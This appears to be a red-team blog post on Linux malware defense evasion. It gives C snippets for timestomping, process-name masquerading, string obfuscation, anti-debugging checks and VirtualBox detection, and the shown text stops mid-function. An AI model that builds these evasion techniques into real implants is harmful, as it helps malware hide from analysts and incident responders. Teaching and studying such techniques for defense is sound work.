<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Linux Malware: Defense Evasion Techniques | BinaryChunk’s Blog</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Linux Malware: Defense Evasion Techniques" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="This post will cover some different detection evasion techniques that can be employed to custom agents in a compromised Linux host. A malware author needs to have good OPSEC making sure that their agent remains stealthy leaving little to no IOCs — this is obviously on top of using a secure and stealthy Red Team Infrastructure." />
<meta property="og:description" content="This post will cover some different detection evasion techniques that can be employed to custom agents in a compromised Linux host. A malware author needs to have good OPSEC making sure that their agent remains stealthy leaving little to no IOCs — this is obviously on top of using a secure and stealthy Red Team Infrastructure." />
<link rel="canonical" href="https://mutur4.github.io/2023/07/15/linux-malware-defense-evasion.html" />
<meta property="og:url" content="https://mutur4.github.io/2023/07/15/linux-malware-defense-evasion.html" />
<meta property="og:site_name" content="BinaryChunk’s Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-07-15T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Linux Malware: Defense Evasion Techniques" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-07-15T00:00:00+00:00","datePublished":"2023-07-15T00:00:00+00:00","description":"This post will cover some different detection evasion techniques that can be employed to custom agents in a compromised Linux host. A malware author needs to have good OPSEC making sure that their agent remains stealthy leaving little to no IOCs — this is obviously on top of using a secure and stealthy Red Team Infrastructure.","headline":"Linux Malware: Defense Evasion Techniques","mainEntityOfPage":{"@type":"WebPage","@id":"https://mutur4.github.io/2023/07/15/linux-malware-defense-evasion.html"},"url":"https://mutur4.github.io/2023/07/15/linux-malware-defense-evasion.html"}</script>
<!-- End Jekyll SEO tag -->
<link id="main-stylesheet" rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://mutur4.github.io/feed.xml" title="BinaryChunk&apos;s Blog" />

<link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg" type="image/svg+xml">
<style>
@font-face {
  font-family: 'Open Sans';
  src: url('//fonts.gstatic.com/s/opensans/v44/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4kaVIGxA.woff2')
       format('woff2');
  font-weight: 400;
  font-style: normal;
  font-display: swap;
  font-stretch: 100%;
}

body {
  font-family: 'Open Sans', sans-serif;
  font-size: 11pt;
}
</style>
</head>
<body><header class="site-header">

  <div class="wrapper">
    <a class="site-title" rel="author" href="/">BinaryChunk&#39;s Blog</a>
      <nav class="site-nav">
        <input type="checkbox" id="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon"></span>
        </label>

        <div class="nav-items">
  <a class="nav-item" href="/ctfs/">CTFs</a>
</div>

      </nav>
  </div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Linux Malware: Defense Evasion Techniques</h1>
    <div class="post-meta">
      <time class="dt-published" datetime="2023-07-15T00:00:00+00:00" itemprop="datePublished">
        Jul 15, 2023
      </time>
    </div>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>This post will cover some different detection evasion techniques that can be employed to custom agents in a compromised Linux host. A malware author needs to have good OPSEC making sure that their agent remains stealthy leaving little to no IOCs — this is obviously on top of using a secure and stealthy <strong>Red Team Infrastructure</strong>.</p>

<p>This post covers showcasing these techniques using <code class="language-plaintext highlighter-rouge">c/c++</code> code snippets, therefore familiarity with the language is a requirement but not needed. The following source code snippet, is the skeleton code that will be used to showcase an implementation of the techniques.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _GNU_SOURCE
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;utime.h&gt;</span><span class="c1"> </span><span class="cp">
#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;dirent.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="c1"> </span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
</span>

<span class="cp">#define SIZE 1048
</span>
<span class="k">extern</span> <span class="kt">char</span> <span class="n">__executable_start</span><span class="p">;</span> <span class="c1">//returns the address of the image base</span>

<span class="c1">//This is called when the debugger is detected.</span>
<span class="kt">void</span> <span class="nf">exit_func</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"Debugger Detected"</span><span class="p">);</span>
	<span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
	<span class="n">time_check</span><span class="p">();</span>
	<span class="n">time_stomp</span><span class="p">();</span> <span class="c1">//spoof the creation date of the malware on disk</span>
	<span class="n">masquerade</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="c1">//Spoof a running process</span>
	<span class="n">check_for_debugger</span><span class="p">();</span> <span class="c1">//check for debugging</span>
	<span class="n">detect_breakpoint</span><span class="p">();</span> <span class="c1">//Look for a software breakpoint (mainly used during debugging)</span>
	<span class="n">vm_check</span><span class="p">();</span> <span class="c1">//check if we are running in a sand-box (VM)</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="time-stomping">Time Stomping</h3>

<p>This is a technique that can be used to avoid detection by modifying the creation date and time of the malware. This is useful when bypassing certain filters that are used to find recently modified or added files. The following code snippet will be used to modify the creation date to <code class="language-plaintext highlighter-rouge">Thursday, October 20, 2008 7:17:16 PM (GMT)</code> which is a very special date <em>(my bd anniversary)</em></p>

<p>This is done using the <code class="language-plaintext highlighter-rouge">utime</code> system call whose signature is as follows:</p>

<p><code class="language-plaintext highlighter-rouge">int utimes(const char *filename, const struct timeval times[2])</code></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">time_stomp</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">){</span>
	<span class="k">struct</span> <span class="n">timeval</span> <span class="n">tv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
	
	<span class="n">tv</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">tv_sec</span> <span class="o">=</span> <span class="mi">1225394236</span><span class="p">;</span>
	<span class="n">tv</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">tv_usec</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	
	<span class="n">tv</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">tv_sec</span> <span class="o">=</span> <span class="mi">1225394236</span><span class="p">;</span>
	<span class="n">tv</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">tv_usec</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">utimes</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">tv</span><span class="p">))</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"[+] TimeStomped!"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">utimes</code> function will take two <code class="language-plaintext highlighter-rouge">time_val</code> structures where one will be the <code class="language-plaintext highlighter-rouge">actime</code> used to change the action time and the <code class="language-plaintext highlighter-rouge">modtime</code> used to change the Modification time.</p>

<h3 id="process-name-masquerading-pid-spoofing">Process Name Masquerading <em>(PID-Spoofing)</em></h3>

<p>To avoid detection when an <code class="language-plaintext highlighter-rouge">analyst/user</code> lists running processes i.e <code class="language-plaintext highlighter-rouge">ps aux</code>, we can masquerade and pretend to be a legitimate <code class="language-plaintext highlighter-rouge">Linux Daemon Process</code>. This is possible because when a process is run in Linux, the Process Name that will be displayed when we list processes is the string at <code class="language-plaintext highlighter-rouge">argv[0]</code> which is passed as an argument to the entry function <em>main()</em>. Therefore, modifing this value on execution will do the job perfectly.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">masquerade</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">){</span>
        <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span> <span class="o">=</span> <span class="s">"ffs-it-worked"</span><span class="p">;</span> <span class="c1">//?? Use a real linux demon process name e.g [kthreadd]</span>
        <span class="n">strcpy</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"[+] %d is now spoofed!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getpid</span><span class="p">());</span>

        <span class="n">getchar</span><span class="p">();</span> <span class="c1">//Pause execution; check proesses 'ps -aux'</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The above code snippet copies the new process name to <code class="language-plaintext highlighter-rouge">argv[0]</code> and this masquerades as the new spoofed process name. A list of legit Linux Processes can also be declared and chosen at random at the beginning of each execution.</p>

<p><img src="https://i.imgur.com/dipqApE.png" alt="A screenshot to showcase a spoofed process" /></p>

<p>The code snippet provided in my GitHub <a href="https://github.com/mutur4/Linux-Malware/blob/main/LinuxMalwareDefenseEvasion/pid-spoof/spoof.c">here</a> is an example of a <code class="language-plaintext highlighter-rouge">C</code> code that will enumerate all the running processes and after each cycle of about an hour, it will spoof another process.</p>

<h3 id="analysis-evasion">Analysis Evasion</h3>
<p>When a <code class="language-plaintext highlighter-rouge">malware</code> is detected in a host or network, it will tend to be dissected and Reverse Engineere’d with the aim of understanding how the malware works and the impact it has or may have caused to an organization. Malware Authors will therefore implement techniques to prevent <code class="language-plaintext highlighter-rouge">static</code> and <code class="language-plaintext highlighter-rouge">dynamic</code> analysis of the malware incase the malware is caught (a fail-safe).</p>

<h4 id="static-analysis">Static Analysis</h4>

<p>There are many ways that can be used to prevent static analysis, the following are some of the techniques that can be implemented.</p>

<ul>
  <li>
    <p>When a binary is stripped via the <code class="language-plaintext highlighter-rouge">-strip</code> command option during compilation, this is used to remove the symbol table therefore preventing the determination of naming mechanism(s) used for functions.</p>
  </li>
  <li><code class="language-plaintext highlighter-rouge">Obfuscation</code> of strings i.e <em>keys</em>, <em>passwords</em>, <em>shellcode</em> etc.. is necesarry in preventing static analysis. There are different obfuscation techniques that can be used:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">IpFuscation</code>: This is where data in the malware will be obfuscated to look like IP address.</li>
      <li><code class="language-plaintext highlighter-rouge">MaCFuscation</code>: This is where data in the malware can be obfuscated to mimic <strong>MAC</strong> address strings.</li>
    </ul>
  </li>
  <li>When strings are also declared as local variables or global variables, they should not be stacked together. The following code snippet explains this is detail.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">const</span> <span class="kt">char</span> <span class="n">xor_key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="sc">'m'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'w'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">};</span> <span class="c1">//not stacked</span>
<span class="k">const</span> <span class="kt">char</span> <span class="n">xor_key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"malware"</span><span class="p">;</span> <span class="c1">//stacked</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Encryption</code> i.e <code class="language-plaintext highlighter-rouge">RC4</code>, <code class="language-plaintext highlighter-rouge">AES</code>, <code class="language-plaintext highlighter-rouge">XOR</code> can also be used to encrypt strings used in the malware.</li>
  <li>The last option is to completely avoid the use of strings where necessary, for example suppose an implant connects to a specific <code class="language-plaintext highlighter-rouge">IP</code>, this can be represented as follows:</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ip_addr</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span><span class="p">;</span> <span class="c1">//This is easily detectable via static analysis</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ip_addr</span> <span class="o">=</span> <span class="mh">0x100007f</span><span class="p">;</span> <span class="c1">// IP converted to a LONG not easily detectable via static analysis </span>
</code></pre></div></div>

<blockquote>
  <p>You can read more on the technique(s) from <a href="https://samples.vx-underground.org/root/Papers/Linux/Evasion/2016-12-20%20-%20Programming%20Linux%20Anti-Reversing%20Techniques.pdf">here</a> referenced below.</p>
</blockquote>

<h3 id="dynamic-analysis">Dynamic Analysis</h3>

<p>For a Reverse Engineer to understand how a malware works, the usual is to run the malware in an isolated environment e.g <code class="language-plaintext highlighter-rouge">inside a VM</code> and further use a debugger for analysis. Malware authors will therefore employ various anti-debugging techniques to try and make dynamic analysis a pain in the ass.</p>

<h4 id="ptrace-self-debugging">Ptrace: Self-Debugging</h4>

<p>From its man-page, <code class="language-plaintext highlighter-rouge">man ptrace</code> is described as a system call by which one process the <strong>tracer</strong> may observe and control the execution of another process the <strong>tracee</strong> used to implement breakpoint debugging.</p>

<p>This is the system call that is used by debuggers and other tracers like <code class="language-plaintext highlighter-rouge">ltrace</code> and <code class="language-plaintext highlighter-rouge">strace</code>. This syscall has one major limitation that can be of an advantage to a malware author.</p>

<blockquote>
  <p>Only one tracer can control a tracee at a time.</p>
</blockquote>

<p>This therefore means, when a tracer is tracing a process, no other tracer can be attached; which can be used to evade the debugger. A malware can therefore spawn a child process or a thread on start-up for self-debugging. When a debugger is attached self-debugging will fail because of the above mentioned limitation. A failed self-debug will be an indication that a debugger is present.</p>

<p>The Reverse Engineer can however patch the call to <code class="language-plaintext highlighter-rouge">ptrace()</code> or modify the return value of <code class="language-plaintext highlighter-rouge">ptrace()</code> to return <code class="language-plaintext highlighter-rouge">TRUE</code> when self-debugging fails. The following are some of the different approaches that can be used to mitigate this but can still be bypassed:</p>
<ul>
  <li>Code Patching Detection.</li>
  <li>Posix timer for self-debugging – The code can be found on my GitHub <a href="https://github.com/mutur4/Linux-Malware/blob/main/LinuxMalwareDefenseEvasion/self-debug/debug_checker.c">here</a></li>
</ul>

<h4 id="timing-analysis">Timing Analysis</h4>

<p>During debugging, there is usually an amount of time taken to read the assembly code, registers or basically understand in-depth the workings of the malware. Timing analysis is a technique that can be used to terminate or change the behaviour of the malware after an amount of time has elapsed as long as the execution of the malware was restarted/started.</p>

<p>The following source code snippet will raise a <code class="language-plaintext highlighter-rouge">SIGALARM</code> signal after <code class="language-plaintext highlighter-rouge">120</code> seconds has elapsed. This is used to make sure, when debugging or when a break-point is hit, if <code class="language-plaintext highlighter-rouge">120</code> seconds elapse, the malware should terminate.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">time_check</span><span class="p">){</span>
	<span class="k">struct</span> <span class="n">sigevent</span> <span class="n">event</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">itimerspec</span> <span class="n">timer</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">sigaction</span> <span class="n">act</span><span class="p">;</span>

        <span class="n">timer_t</span> <span class="n">tid</span><span class="p">;</span>

        <span class="n">act</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">exitFunc</span><span class="p">;</span>

        <span class="n">sigaction</span><span class="p">(</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">act</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

        <span class="n">event</span><span class="p">.</span><span class="n">sigev_notify</span> <span class="o">=</span> <span class="n">SIGEV_SIGNAL</span><span class="p">;</span>
        <span class="n">event</span><span class="p">.</span><span class="n">sigev_signo</span> <span class="o">=</span> <span class="n">SIGALRM</span><span class="p">;</span>

        <span class="k">if</span><span class="p">((</span><span class="n">timer_create</span><span class="p">(</span><span class="n">CLOCK_REALTIME</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tid</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
                <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>

        <span class="n">timer</span><span class="p">.</span><span class="n">it_value</span><span class="p">.</span><span class="n">tv_sec</span> <span class="o">=</span> <span class="mi">120</span><span class="p">;</span> <span class="c1">//terminate after 120 secondz</span>

        <span class="k">if</span><span class="p">((</span><span class="n">timer_settime</span><span class="p">(</span><span class="n">tid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">timer</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
                <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">exitFunc</code> is a sighandler that will handle the raised signal, it can be used to terminated or change the behaviour of the malware. The time check should also be included before the execution of the main function probably defined in a <code class="language-plaintext highlighter-rouge">__constructor__</code> decorated function.</p>

<blockquote>
  <p>The chosen time taken to raise the signal should be a time <strong>greater than</strong> than that taken to complete the execution of the process.</p>
</blockquote>

<h4 id="debugger-bp-break-point-detection">Debugger BP (break-point) Detection</h4>

<p>A mechanism can be employed to check for the  3rd interrupt instruction <strong>INT3</strong> <code class="language-plaintext highlighter-rouge">0xcc</code> in memory to determine the presence of a debugger. When a breakpoint is set, the debugger overwrites the target address where the breakpoint is put with <code class="language-plaintext highlighter-rouge">0xcc</code>. This is explained in much detail <a href="https://linuxsecurity.com/features/hacker-s-corner-complete-guide-to-anti-debugging-in-linux-part-3">here</a></p>

<p>The following code snippet can therefore be used to search for the breakpoint instruction in memory.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">detect_breakpoint</span><span class="p">(){</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">_start_address</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">detect_breakpoint</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">pageSize</span> <span class="o">=</span> <span class="n">sysconf</span><span class="p">(</span><span class="n">_SC_PAGESIZE</span><span class="p">);</span>
	
	<span class="n">mprotect</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">intptr_t</span><span class="p">)</span><span class="n">_start_address</span> <span class="o">&amp;~</span> <span class="mh">0xfff</span><span class="p">),</span> <span class="n">pageSize</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">);</span> <span class="c1">//make sure the page is readable</span>

	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">intptr_t</span><span class="p">)</span> <span class="n">_start_address</span> <span class="o">&amp;~</span> <span class="mh">0xfff</span><span class="p">);</span>

	<span class="k">for</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">pageSize</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">mem</span> <span class="o">==</span> <span class="mh">0xcc</span><span class="p">){</span> <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"BreakPoint detected!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
		<span class="n">mem</span><span class="o">++</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>	
</code></pre></div></div>

<blockquote>
  <p>A break-point will most definately be set in the <code class="language-plaintext highlighter-rouge">.text</code> section, therefore using <code class="language-plaintext highlighter-rouge">0xcc</code> in the stack (to be used in the search) will have no effect on the search functionality.</p>
</blockquote>

<p>The above function will get the pagesize dynamically; change the protection of the page to make sure its readable/accessible and will traverse that page to find a breakpoint since functions in an <code class="language-plaintext highlighter-rouge">ELF</code> binary tend to be in the same page in memory.</p>

<h4 id="check-for-debuging-processes">Check for Debug(ing) Processes</h4>

<p>When a process is started from the debugger, the debugger will be the parent process. A linux parent process can be looked up from the <code class="language-plaintext highlighter-rouge">/proc/self/stat</code> or the <code class="language-plaintext highlighter-rouge">/proc/self/status</code>.</p>

<p>The <code class="language-plaintext highlighter-rouge">/proc/self/status</code> has a <code class="language-plaintext highlighter-rouge">PPID</code> value which is the parent process. The parent process name can further be obtained from <code class="language-plaintext highlighter-rouge">/proc/&lt;PID&gt;/cmdline</code> and checked against some of the common linux debuggers. The symlink to <code class="language-plaintext highlighter-rouge">/proc/&lt;PID&gt;/exe</code> can also be resolved to find the path of the actual file in memory. The following <code class="language-plaintext highlighter-rouge">C</code> source code snippet can be used for this implementation.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">check_for_debugger</span><span class="p">(){</span>
	<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/status"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span> <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>

	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">SIZE</span><span class="p">];</span>
	<span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
	<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
	
	<span class="kt">char</span> <span class="o">*</span><span class="n">needle</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"PPid:"</span><span class="p">);</span>
	
	<span class="k">if</span><span class="p">(</span><span class="n">needle</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">comm</span> <span class="o">=</span> <span class="n">needle</span><span class="p">;</span>
	
	<span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">comm</span> <span class="o">!=</span> <span class="mh">0x0</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">comm</span> <span class="o">!=</span> <span class="mh">0xa</span><span class="p">)</span> <span class="n">comm</span><span class="o">++</span><span class="p">;</span>
	<span class="o">*</span><span class="n">comm</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
	
	<span class="kt">int</span> <span class="n">ppid</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">needle</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="s">"PPid:"</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">comm</span><span class="p">));</span>
	<span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="n">SIZE</span><span class="p">],</span> <span class="n">procs</span><span class="p">[</span><span class="n">SIZE</span><span class="p">];</span>
	
	<span class="n">snprintf</span><span class="p">(</span><span class="n">procs</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">procs</span><span class="p">),</span> <span class="s">"/proc/%d/exe"</span><span class="p">,</span> <span class="n">ppid</span><span class="p">);</span>
	<span class="n">readlink</span><span class="p">(</span><span class="n">procs</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">));</span>

	<span class="kt">char</span> <span class="o">*</span><span class="n">debugs</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"gdb"</span><span class="p">,</span> <span class="s">"radare"</span><span class="p">,</span> <span class="s">"r2"</span><span class="p">};</span> <span class="c1">//add more debuggers</span>
	
	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">debugs</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
		<span class="k">if</span><span class="p">((</span><span class="n">strstr</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">debugs</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
			<span class="k">continue</span><span class="p">;</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"Debugger Found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	
<span class="p">}</span>
</code></pre></div></div>

<p>The above source code snippet will basically read the <code class="language-plaintext highlighter-rouge">PPID</code> value from <code class="language-plaintext highlighter-rouge">/proc/self/status</code> and resolve the symlink for that parent process. This will then be compared against an array of debugger names to determine if the process is being debugged.</p>

<p>The same can performed by reading the Parent Process ID from <code class="language-plaintext highlighter-rouge">/proc/self/stat</code>; which is usually the fourth value.</p>

<p>The <code class="language-plaintext highlighter-rouge">TracerPid</code> value from <code class="language-plaintext highlighter-rouge">/proc/self/status</code> can also be checked to determine if a process is being debugger; <code class="language-plaintext highlighter-rouge">1</code> indicates the presence of a debugger and <code class="language-plaintext highlighter-rouge">0</code> indicates the absence of a debugger. This implements the almost the same logic as the Windows <code class="language-plaintext highlighter-rouge">isDebuggerPresent</code>.</p>

<h3 id="sandbox--vm-evasion">SandBox &amp;&amp; VM Evasion</h3>

<p>These are techniques that can be employed to detect the kind of environment the malware is running on. Based on certain heuristics, the malware can change behaviour, delete itself or terminate on execution when it detects that it is running in a sand-boxed environment or a VM.</p>

<p>The following are the various ‘features’ that can be checked to determine if a malware is running in a VM.</p>

<p><em><strong>Kernel Driver(s)</strong></em></p>

<p>There are specific Kernel Drivers that are loaded into the Kernel when the VM is started. For exampe for VirtualBox, the following drivers can be registered:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/dev/vboxguest</code></li>
  <li><code class="language-plaintext highlighter-rouge">/dev/vboxuser</code></li>
</ul>

<p><em><strong>PCI Devices</strong></em></p>

<p>Some Virtulization technologie(s) implemented <strong>Peripheral Component Interconnect</strong> passthroughs to provide a way to share some hardware resources with the host Operating System. The following bash command for example can be used as an indicator to know if we are inside a <code class="language-plaintext highlighter-rouge">VirtualBox</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lspci <span class="nt">-d</span> 80ee:cafe
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">80ee</code> is the Vendor  ID in this case VirtualBox while <code class="language-plaintext highlighter-rouge">cafe</code> is the device ID. The vendor id’s can be looked up from <a href="htts://pcilookup.com">here</a>.</p>

<p>The following is the <code class="language-plaintext highlighter-rouge">C</code> code snippet that can be used to check if we are indeed in a VM.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">vm_check</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
        <span class="kt">DIR</span> <span class="o">*</span><span class="n">dir</span> <span class="o">=</span> <span class="n">opendir</span><span class="p">(</span><span class="s">"/dev"</span><span class="p">);</span>
        <span class="kt">char</span> <span class="o">*</span><span class="n">drivers</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"vboxuser"</span><span class="p">,</span> <span class="s">"vboxguest"</span><span class="p">};</span> <span class="c1">//add other VM drivers </span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">dir</span><span class="p">)</span>
